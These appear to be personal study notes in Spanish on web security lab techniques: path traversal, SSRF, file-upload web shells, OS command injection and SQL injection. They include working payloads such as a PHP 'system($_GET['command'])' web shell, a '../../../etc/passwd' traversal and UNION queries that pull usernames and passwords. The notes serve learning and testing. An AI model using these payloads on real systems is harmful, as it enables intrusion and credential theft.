# Seguridad Informática
- [Burp Suite](#burp-suite)
- [John the Ripper](#john-the-ripper)
- [Metasploit](#metasploit)
- [Nmap](#nmap)
- [Wireshark](#wireshark)
- [Sqlmap](#sqlmap)

Este documento recopila información y notas personales sobre diversas herramientas y técnicas en el campo de la seguridad informática.

## Burp Suite

Burp Suite es una herramienta esencial para el análisis de seguridad de aplicaciones web. Permite realizar pruebas manuales y automatizadas para identificar vulnerabilidades de seguridad.

### Path Traversal
Permite al atacante aceder a archivos que no deberia. Por ejemplo `https://insecure-website.com/loadImage?filename=../../../etc/passwd` permitiria acceder a `/var/www/images/../../../etc/passwd` que daria lugar a que se accediese en realidad a `/etc/passwd`.

### Autenticacions y autorizacion
- Autenticacion es que sea quien dice ser, autorizacion que tenga permisos de hacer algo.

### Trucos
- Es posible eludir el 2FA cuando la verificación se realiza en una página distinta.
- En robots txt se puede encontrar informacion sobre partes prohibidas.
- Se pueden modificar las cookies en los responses request, o en el inspector->aplications.
- AL intentar adivinar usuario, si acertamos: el mensaje de error o codigo puede ser distinto. si la contrasenia es mas larga puede demorar mas en caso de que el usuario exista.

### SSRF
- La falsificación de solicitud del lado del servidor (Server-side request forgery o SSRF) es una vulnerabilidad de seguridad web que permite a un atacante hacer que una aplicación del lado del servidor realice solicitudes a una ubicación no deseada, pudiendo conectar con servicios internos o externos y filtrar datos sensibles, como credenciales de autorización.
- Ejemplo: `POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://stock.weliketoshop.net:8080/product/stock/check%3FproductId%3D6%26storeId%3D1`
Cambiamos la ultima linea por `stockApi=http://localhost/admin`
Tambien pueden ser de la forma `stockApi=http://192.168.0.X/admin` en cuyo caso hay que explorar en X. El 0 puede ser 1.

### File vulnerabilities
- Se puede subir archivo php: `<?php echo file_get_contents('/path/to/target/file'); ?>` o `<?php echo system($_GET['command']); ?>` que luego puede ser `GET /example/exploit.php?command=id HTTP/1.1`
- Se puedden subir cambiando el content type en el request por `image/jpeg` o `image/png` (mandandolo a repetidor)

### OS commandd injection
#### Comandos utiles
| Propósito del comando        | Linux    | Windows         |
|------------------------------|----------|-----------------|
| Nombre del usuario actual    | `whoami` | `whoami`        |
| Sistema operativo            | `uname -a` | `ver`          |
| Configuración de red         | `ifconfig` | `ipconfig /all` |
| Conexiones de red            | `netstat -an` | `netstat -an` |
| Procesos en ejecución        | `ps -ef` | `tasklist`      |

##### Uso de la línea de comandos para testing
- Ejemplo de comando: `stockreport.pl 381 29` en línea de comandos para acceder al stock.
  - Payload de ejemplo: `productId=1&storeId=1; whoami`. Si se ejecuta desde terminal, este payload puede ser procesado sin mayores restricciones. ; o & o &&

### Detección de vulnerabilidades de inyección SQL

- Para detectar vulnerabilidades de inyección SQL manualmente, realiza un conjunto sistemático de pruebas contra cada punto de entrada en la aplicación.
- El caracter ' y buscar errores o anomalías.
- Sintaxis específica de SQL que evalúa al valor base (original) del punto de entrada, y a un valor diferente, y busca diferencias sistemáticas en las respuestas de la aplicación.
- Condiciones booleanas tales como OR 1=1 y OR 1=2, y busca diferencias en las respuestas de la aplicación.
- Cargas útiles diseñadas para provocar retrasos de tiempo cuando se ejecutan dentro de una consulta SQL, y busca diferencias en el tiempo que tarda en responder.
 - Cargas útiles OAST diseñadas para desencadenar una interacción de red fuera de banda cuando se ejecutan dentro de una consulta SQL, y monitorea cualquier interacción resultante. Útiles para identificar vulnerabilidades que implican la ejecución de código o la exposición de datos sensibles a través de canales secundarios, como DNS, correos electrónicos, o sistemas de mensajes.

El Burp Scanner debería ser capaz de encontrar las inyecciones SQLs obvias.
La mayoría de vulnerabilidades ocurren en la clausula WHERE del SELECT.
Sin embargo, también es común encontrarlos en el WHERE del UPDATE, en los valores del INSERT, en la tabla o nombre de columna del SELECT, o en los ORDER BY.

#### Ejemplo 1
`https://insecure-website.com/products?category=Gifts`

podría hacer que la aplicación ejecute este código:

`SELECT * FROM products WHERE category = 'Gifts' AND released = 1`

Podríamos agregar dos líneas para que el resto se comentase, logrando que se evitase el release=1:

`https://insecure-website.com/products?category=Gifts'--`

También agregar lo siguiente para que muestre todo, no solo de la categoría Gifts:

`https://insecure-website.com/products?category=Gifts'+OR+1=1--`

#### Ejemplo 2
Al poner usuario y contraseña, el servidor ejecuta:

`SELECT * FROM users WHERE username = 'usr' AND password = 'pass'`

Y si la query devuelve los datos, entonces se hace el login, de lo contrario es rechazado. Usando `--` un usuario podria evitar la parte del `AND password = 'pass'`, logrando ser capaz de logearse como cualquier usuario

### Inyecciones SQL de ataque UNION
Union permite agregar otro SELECT luego del SELECT inicial:

`SELECT a, b FROM table1 UNION SELECT c, d FROM table2`

Para que funcione se deben cumplir dos condiciones:
- Cada query debe devolver la misma cantidad de columnas.
- Los tipos de cada columna deben ser compatibles entre los distintoss querys, en este ejemplo a con c y b con d.
Al intentar hacer un ataque UNION, hay dos metodos efectivos para determinar cuantas columnas devuelve la query original.
#### Método 1
Inyectar series de ORDER BY e incrementar el indice de columna hasta que ocurra un error. Por ejemplo, si el punto de inyección es un string dentro de un WHERE, podría intentarse esto:

`' ORDER BY 1--`  
`' ORDER BY 2--`  
`' ORDER BY 3--`  
`etc.`

Cuando se exceda el numero de columna, la base dara un error del estilo  
`The ORDER BY position number 3 is out of range of the number of items in the select list.`  
Sin embargo este error podría o no devolverse en la respuesta HTTP. Tambien podría devolver un error genérico o no devolver nada. Sin embargo si se puede detectar alguna diferencia en la respuesta, se puede inferir cuántas columnas están siendo devueltas.  
Sirve mirar en que orden se ordenan los componentes http para ver cual columna es cual. Puede dar pistas.
#### Método 2
La otra opción es subir una serie de payloads UNION SELECT especificando distintos valores NULL:

`' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
etc.`

que devolverá un error si no macchea con la cantidad de columnas de la base de datos.
Usamos NULL ya que no sabemos que tipo de datos tiene cada columna, y NULL es convertible a todos los tipos de datos asi que maximiza la chance de que el payload tenga exito cuando la cantidad de atributos corresponda con la columna. Sin embargo, tener en cuenta que pueden haber columnas que no pueden contener valor NULL.
Si la consulta tiene exito y es devuelta por el HTTP, devolvera una fila extra con valores NULL en cada columna. Tambien podrian generar un NullPointerException. En el peor de los casos la respuesta se verá igual acertando o errando la cantidad, en cuyo caso este metodo no es efectivo.

#### Sintaxis especifico de database
- En Oracle se usa FROM DUAL para obtener info random por ejemplo del sistema. Se pueden hacer varias cosas interesantes con lo de DUAL, como consultar el usuario de la bd, llamar a funciones, entre otras cosas random.
- En  MySQL el -- tiene que ir seguido de un espacio, o se puede usar un # para marcar un comentario

[SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet) de las diversas particularidades de cada DB.

#### Obtener columnas que devuelvan string
La informacion interesante usualmente esta en forma de string. Esto significa que queremos encontrar las columnas cuyo tipo de datos sea string o compatible con string. Por ejemplo asi:

`' UNION SELECT 'a',NULL,NULL,NULL--`  
`' UNION SELECT NULL,'a',NULL,NULL--`  
`' UNION SELECT NULL,NULL,'a',NULL--`  
`' UNION SELECT NULL,NULL,NULL,'a'--`

Si el tipo de dato de la columna no es compatible con string, el query causara un error en la base de datos, que una vez mas podra ser o no visible en la respuesta http. Esto sirve como para explorar la BD.

#Punto de inyeccion: el punto en la consulta sql al que podemos inyectarle mierda  
Se puede hacer ´' UNION SELECT username, pass FROM users--´ por ejemplo

#### Concatenar varias columnas en una sola
A veces la consulta SQL del servidor devuelve una cantidad menor de columnas de las que queremos extraer. Para esto, podemos concatenar varios valores de columnas en una sola.  
Por ejemplo, en Oracle se hace asi:  
´' UNION SELECT username || '~' || password FROM users--´  
El || concatena y el ~ en este caso simplemente separa, pero podria ser cualquier otro simbolo.  
Una vez más, en el [SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet) se puede encontrar la sintaxis de cada DB.

##### Ejemplo
Hay una consulta que da dos campos, un codigo int y un string. Para obtener los resultados puedo usar  
´' UNION SELECT 1,username || '~' || password FROM users--´  
El 1 es para que quede ese valor en la primera columna, ya que el esquema del union select tiene que ser compatible con el select original. Los espacios en realidad serían +, en todas las inyecciones (´'+UNION+SELECT+1,username+...´)

#### Examinando la base de datos
Para explotar vulnerabilidades SQL se necesita conocer el tipo y version de la base asi como las tablas y columnas que contiene esta base.

| Tipo de base     | Consulta                 |
|------------------|--------------------------|
| Microsoft, MySQL | `SELECT @@version`       |
| Oracle           | `SELECT * FROM v$version`|
| PostgreSQL       | `SELECT version()`       |  
Podria usarse por ejemplo con un UNION.

## John the Ripper

(TBD - Información por agregar)

## Metasploit

(TBD - Información por agregar)

## Nmap

(TBD - Información por agregar)

## Wireshark

(TBD - Información por agregar)

## Sqlmap

(TBD - Información por agregar)

